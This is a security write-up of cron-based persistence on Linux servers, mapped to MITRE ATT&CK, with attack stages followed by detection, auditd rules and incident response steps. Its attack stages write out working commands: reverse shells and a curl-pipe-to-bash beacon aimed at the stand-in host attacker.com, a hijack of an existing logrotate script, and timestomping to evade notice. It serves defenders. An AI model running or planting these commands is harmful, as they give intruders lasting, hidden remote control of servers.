# Attack Chain: Cron-Based Persistence on Linux Servers

## Overview

Adversaries abuse the Unix cron scheduling daemon to establish persistence on compromised Linux systems. By inserting malicious jobs into cron configuration files or directories, attackers ensure their payloads execute automatically at scheduled intervals — surviving reboots, process kills, and even partial cleanup attempts.

**MITRE ATT&CK Mapping:**
- Tactic: Persistence (TA0003)
- Technique: Scheduled Task/Job: Cron (T1053.003)

---

## Attack Chain

### Stage 1 — Initial Access

The attacker gains a foothold on the target system through one of several common vectors:

- Exploitation of a public-facing service (web shell, RCE vulnerability)
- Credential theft / brute force of SSH
- Supply chain compromise delivering a malicious package
- Phishing leading to remote code execution

At this stage, the attacker has at minimum a low-privilege shell on the target.

---

### Stage 2 — Discovery

Before installing persistence, the attacker enumerates the cron landscape to identify writable locations and understand existing scheduled jobs:

```bash
# List current user's crontab
crontab -l

# List root crontab (if privileged)
crontab -u root -l

# Enumerate system-wide cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Check the main crontab file
cat /etc/crontab

# Find world-writable cron scripts
find /etc/cron* -perm -o+w 2>/dev/null

# Find cron-related files owned by the current user
find /var/spool/cron/ -user $(whoami) 2>/dev/null
```

The attacker also checks which user context they are operating in, as this determines where they can write cron jobs.

---

### Stage 3 — Privilege Escalation (Optional)

For maximum persistence impact, the attacker may escalate to root before installing cron jobs. Root-level cron jobs:

- Execute with full system privileges
- Can be placed in protected directories (`/etc/cron.d/`, `/etc/crontab`)
- Are harder to detect and remove by non-root defenders

Common escalation paths preceding cron abuse:
- SUID binary exploitation
- Sudo misconfiguration
- Kernel exploit
- Writable cron script owned by root (circular: cron itself used to escalate)

---

### Stage 4 — Persistence Installation

The attacker installs a malicious cron entry. The payload typically connects back to attacker infrastructure or executes a locally staged implant.

#### 4a — User-Level Crontab

```bash
# Append a reverse shell job to the current user's crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
```

#### 4b — System Cron Directory Drop

```bash
# Drop a script into /etc/cron.d/ (requires elevated privileges)
cat > /etc/cron.d/sysupdate << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root curl -s http://attacker.com/beacon.sh | bash
EOF
chmod 644 /etc/cron.d/sysupdate
```

#### 4c — Hijacking an Existing Cron Script

```bash
# Prepend malicious command to an existing daily cron script
sed -i '1s/^/\/bin\/bash -i >& \/dev\/tcp\/attacker.com\/4444 0>&1\n/' /etc/cron.daily/logrotate
```

#### 4d — /etc/crontab Modification

```bash
# Append entry directly to /etc/crontab
echo "*/15 * * * * root /tmp/.hidden/implant" >> /etc/crontab
```

#### Common Payload Techniques

| Payload Type | Example |
|---|---|
| Reverse shell | `bash -i >& /dev/tcp/C2/PORT 0>&1` |
| Download & execute | `curl -s http://C2/payload \| bash` |
| Local staged binary | `/tmp/.systemd-private-xyz/implant` |
| Base64-encoded payload | `echo <b64> \| base64 -d \| bash` |

---

### Stage 5 — Defense Evasion

Attackers take steps to reduce the visibility of their cron-based persistence:

- **Hidden filenames:** Prefix script names with `.` (e.g., `.cron_update`)
- **Legitimate-looking names:** Name scripts after real system tools (`logrotate`, `sysupdate`, `aide`)
- **Timestomping:** Modify file timestamps to blend with surrounding files
  ```bash
  touch -r /etc/cron.daily/logrotate /etc/cron.d/sysupdate
  ```
- **Minimal footprint payloads:** Use short one-liners vs. dropped files
- **Output suppression:** Redirect stdout/stderr to `/dev/null` to prevent email delivery to root
  ```bash
  */5 * * * * root /tmp/.update >/dev/null 2>&1
  ```
- **No-log shells:** Use `sh -c` or environment tricks to reduce audit trail

---

### Stage 6 — Command & Control

Once the cron job fires, the attacker establishes a C2 channel:

- Reverse TCP/UDP shell to attacker-controlled server
- DNS-based C2 via periodic `curl`/`wget` polling
- ICMP tunneling
- Encrypted callback over HTTPS to blend with normal traffic

The recurring nature of cron means C2 re-establishes automatically if a session is lost.

---

## Detection Opportunities

### File System

| Location | What to Monitor |
|---|---|
| `/var/spool/cron/crontabs/*` | New or modified user crontabs |
| `/etc/cron.d/` | New files, especially recently created ones |
| `/etc/crontab` | Modifications to the main crontab |
| `/etc/cron.{hourly,daily,weekly,monthly}/` | New or modified scripts |

### Process Behavior

- `crontab -e` or `crontab` invocations from unexpected users
- Child processes of `cron` or `crond` spawning shells (`bash`, `sh`, `dash`)
- `cron` child processes initiating outbound network connections
- Processes with suspicious parent chain: `crond -> bash -> curl/wget/nc`

### Command-Line Indicators

```
# Suspicious cron installation patterns
(crontab -l; echo ...) | crontab -
echo ... >> /etc/crontab
cat > /etc/cron.d/...
```

### Log Sources

- `/var/log/syslog` or `/var/log/cron` — cron execution logs
- `/var/log/auth.log` — crontab editing events
- Auditd rules on cron file paths
- EDR process tree telemetry

### Example Auditd Rules

```
-w /etc/cron.d/ -p wa -k cron_persistence
-w /etc/crontab -p wa -k cron_persistence
-w /var/spool/cron/ -p wa -k cron_persistence
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/crontab -k crontab_exec
```

---

## Response Guidance

### Containment

1. Identify and terminate any active sessions spawned by the malicious cron job
2. Block outbound connections to identified C2 infrastructure at the network perimeter
3. Do **not** immediately remove the cron entry — preserve forensic evidence first

### Eradication

1. Dump and review all cron locations before modifying anything:
   ```bash
   for user in $(cut -f1 -d: /etc/passwd); do
     echo "=== $user ==="; crontab -u $user -l 2>/dev/null
   done
   cat /etc/crontab
   ls -la /etc/cron.*
   ```
2. Remove malicious cron entries
3. Delete any dropped payloads or staging files
4. Audit for additional persistence mechanisms (systemd units, bashrc modifications, SSH authorized_keys)

### Recovery

1. Rotate credentials for any accounts present on the system
2. Patch the initial access vulnerability
3. Restore modified legitimate cron scripts from known-good backups or package manager
4. Verify system integrity with a file integrity monitoring tool

---

## References

- [MITRE ATT&CK T1053.003 — Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
- Linux `man 5 crontab` — crontab file format
- Linux `man 8 cron` — cron daemon documentation
